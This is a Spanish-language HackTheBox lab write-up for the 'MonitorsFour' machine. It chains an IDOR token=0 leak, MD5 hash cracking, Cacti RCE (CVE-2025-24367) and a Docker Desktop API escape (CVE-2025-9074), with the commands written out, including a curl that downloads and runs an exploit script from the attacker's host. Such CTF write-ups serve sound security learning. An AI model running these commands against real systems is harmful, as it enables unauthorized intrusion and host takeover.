# 🖥️ MonitorsFour — HackTheBox Writeup
---

## 🧠 ¿Qué aprendí en esta máquina?

MonitorsFour es una máquina que encadena múltiples vulnerabilidades reales. No hay un solo fallo que te lleve al root — tienes que construir un camino, paso a paso. Lo que más me gustó fue el escape de Docker: algo que suena imposible termina siendo posible por una mala configuración muy específica de Docker Desktop.

---

## 🗺️ Cadena de ataque resumida

```
IDOR (token=0) → Hash cracking → Credential reuse → Cacti RCE (CVE-2025-24367) → Docker API sin auth (CVE-2025-9074) → Windows SYSTEM
```

---

## 🔍 Fase 1 — Reconocimiento

Lo primero siempre es un escaneo agresivo con nmap:

```bash
sudo nmap -sS -sCV --open -p- --min-rate 5000 -n -Pn 10.129.5.207 -oN escaneo.txt
```

| Puerto | Servicio |
|--------|----------|
| 80/tcp | nginx (HTTP) |
| 5985/tcp | WinRM (Windows) |

Aquí ya empiezan las sospechas. Nginx es típico de Linux, pero WinRM es 100% Windows. Esa combinación me dice que muy probablemente hay contenedores de por medio — algo que va a ser clave más adelante.

---

## 🔍 Fase 2 — Enumeración de subdominios

La página principal de `monitorsfour.htb` es una landing corporativa sin funcionalidad real. Busco subdominios con ffuf:

```bash
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.monitorsfour.htb" -fs 138 -u http://10.129.5.207
```

Resultado: `cacti` → me lleva a `cacti.monitorsfour.htb` con **Cacti v1.2.28**.

> 💡 Siempre enumera subdominios. Alguien siempre deja una ventana abierta.

---

## 🔓 Fase 3 — IDOR con token=0

Explorando la API del sitio principal encuentro `/user`. Requiere un token, pero al probar `token=0` el servidor devuelve todos los usuarios con sus hashes:

```bash
curl http://monitorsfour.htb/user?token=0
```

```json
{"username":"admin","password":"56b32eb43e6f15395f6c46c1c9e1cd36","name":"Marcus Higgins"}
```

**¿Por qué funciona?** En Python (y otros lenguajes), `0` es un valor **falsy**. El código hace `if token:` en lugar de `if token is not None`, así que cuando llega `0` salta la validación completa y devuelve todos los usuarios. Una línea de código con consecuencias enormes.

---

## 🔑 Fase 4 — Hash cracking

Los hashes de 32 chars hexadecimales son MD5. Uso john:

```bash
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

`56b32eb43e6f15395f6c46c1c9e1cd36` → **wonderful1**

Credenciales: `marcus:wonderful1`

---

## 🌵 Fase 5 — Acceso a Cacti

Login en `cacti.monitorsfour.htb` con `marcus:wonderful1` → acceso de administrador completo. La reutilización de credenciales funciona casi siempre.

---

## 🚀 Fase 6 — RCE via CVE-2025-24367

**CVE-2025-24367** es una inyección en el campo `right_axis_label` de las plantillas de gráficos de Cacti. El campo no sanitiza la entrada y Cacti lo pasa directamente a RRDtool, que puede crear archivos arbitrarios. Se inyectan comandos RRDtool que escriben un webshell PHP en el servidor.

```bash
sudo python3 exploit.py -url http://cacti.monitorsfour.htb \
  -u marcus -p wonderful1 -i 10.10.15.240 -l 9001
```

Recibo shell como `www-data@821fbd6a43fa` — ese hostname es un **ID de contenedor Docker**. Estamos dentro de un contenedor.

---

## 🏴 Flag de usuario

```
user.txt → xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

---

## 🐳 Fase 7 — Reconocimiento del entorno

```bash
uname -a
# Linux 6.6.87.2-microsoft-standard-WSL2
```

**WSL2**. La arquitectura real es:

```
Windows 11 Host
  └── WSL2 (VM con kernel Linux)
        └── Docker Desktop
              └── Contenedor Cacti  ← estamos aquí
```

---

## 🔓 Fase 8 — Escape de Docker via CVE-2025-9074

### ¿Qué es el problema?

**Docker Desktop** para Windows usa WSL2 como backend para correr contenedores Linux. Internamente, el Docker Engine queda expuesto en `192.168.65.7:2375` — la IP de la interfaz de red interna de WSL2. Esta dirección es **accesible desde dentro de cualquier contenedor**.

El problema crítico: **la API no tiene autenticación por defecto**. Cualquier contenedor comprometido puede conectarse a ella y tener control total sobre el Docker Engine del host: crear contenedores privilegiados, montar el filesystem del Windows, ejecutar comandos como root.

Esto es **CVE-2025-9074**: una vulnerabilidad de diseño en Docker Desktop que permite escape de contenedores hacia el sistema Windows host.

```bash
curl http://192.168.65.7:2375/version
# {"Version":"28.3.2","KernelVersion":"6.6.87.2-microsoft-standard-WSL2"}
```

Confirmado: API de Docker sin autenticación accesible.

### Explotación

```bash
cd /tmp
curl -O http://10.10.15.240:8000/cve-2025-9074.sh
chmod +x cve-2025-9074.sh
./cve-2025-9074.sh 192.168.65.7 'cat /host_root/mnt/host/c/Users/Administrator/Desktop/root.txt'
```

El script automáticamente enumera imágenes disponibles (sin necesitar internet), crea un contenedor nuevo montando `/` del host WSL2 en `/host_root`, ejecuta el comando vía la API y limpia el contenedor.

### ¿Por qué la ruta es tan anidada?

```
/host_root          → filesystem de WSL2 montado en nuestro contenedor
  /mnt/host         → donde WSL2 monta el filesystem de Windows
    /c              → unidad C: de Windows
      Users/Administrator/Desktop/root.txt
```

Tres capas de virtualización atravesadas para llegar al archivo.

---

## 🏆 Flag de root

```
root.txt → xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

---

## 📚 Lecciones aprendidas

- **Valores falsy**: `if token` ≠ `if token is not None`. Siempre probar `0`, `-1`, `null`, `""`.
- **Subdominios**: nunca te quedes solo con el dominio raíz.
- **Reutilización de credenciales**: prueba cada credencial en todos los servicios.
- **Entiende el CVE, no solo lo ejecutes**: saber el mecanismo te salva cuando algo falla.
- **Docker Desktop expone la API sin auth**: CVE-2025-9074 no es un bug de código oscuro, es una consecuencia de diseño predecible.
- **Documenta los caminos muertos**: SSH cerrado, claves RSA de la BD de Cacti (red herring), WinRM con marcus (credencial diferente en Windows) — todo eso me enseñó lo que no funcionar antes de encontrar lo que sí.
